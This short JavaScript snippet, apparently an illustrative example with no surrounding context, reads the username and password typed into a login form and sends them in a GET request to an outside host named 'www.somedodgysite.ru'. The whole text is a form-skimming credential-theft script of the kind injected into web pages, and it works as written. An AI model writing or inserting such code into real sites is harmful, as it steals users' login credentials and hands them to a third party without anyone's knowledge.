username = $("input.js-login-username-input").val();
password = $("input.js-login-password-input").val();

$.get("www.somedodgysite.ru?username=" + username + "&amp;password=" + password);
